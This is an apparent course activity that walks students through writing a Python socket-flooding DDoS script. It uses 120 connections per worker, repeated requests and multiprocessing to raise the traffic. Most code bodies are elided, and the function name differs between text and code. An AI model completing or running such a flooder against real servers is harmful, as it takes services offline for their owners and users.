Perform the DDOS Attack
======================
In this activity, you will perform DDOS attacks by making multiple connections and sending server request at the same time from the all the connections.


<img src= "https://s3.amazonaws.com/media-p.slid.es/uploads/2071954/images/10973663/Slide-11_v2.gif" width = "auto" height = "auto">




Follow the given steps to complete this activity.




Follow the given steps to complete this activity:
1. Perform DDOS attack




* Open file `main.py`.




* Set the number of sockets and create a list to store socket messages.


```sh
number_of_sockets = 120
sockets = []
```
   
* Iterate through each connection to connect and perform DOS using a for loop.


```sh
for i in range(number_of_sockets):
..
for ddos in sockets:
..
```
   
* Pass the connection count to the ddos_attacker() function call.
 
```sh
ddos_attack(ip_address, port, number_of_sockets)
```
   




* Close the connection for each socket once the attack is performed.


```sh
for conn_close in sockets:
    try:
        conn_close.close()
    except:
        pass
```
   




* Increase the network traffic by performing multiple attacks from multiple connections using multiprocessing.Process() method.


```sh
for i in range(number_of_workers):
    worker = multiprocessing.Process(target= ddos_attack, args=(ip_address, port, number_of_sockets))
    workers.append(worker)
```
   
* Save and run the code to check the output.




